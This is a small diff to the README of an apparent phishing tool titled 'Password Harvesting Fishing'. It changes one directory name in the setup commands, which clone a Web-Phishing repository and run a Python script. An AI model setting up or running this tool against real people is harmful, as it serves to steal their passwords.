@@ -21,7 +21,7 @@ Password Harvesting Fishing
 ```bash
 git clone https://github.com/hosseinkasaiyan/Web-Phishing.git
 install php  https://www.php.net/
-cd Web-tester-main
+cd Web-Phishing
 pip3 install -r requirements.txt
 python3 Web-tester.py 
 ```
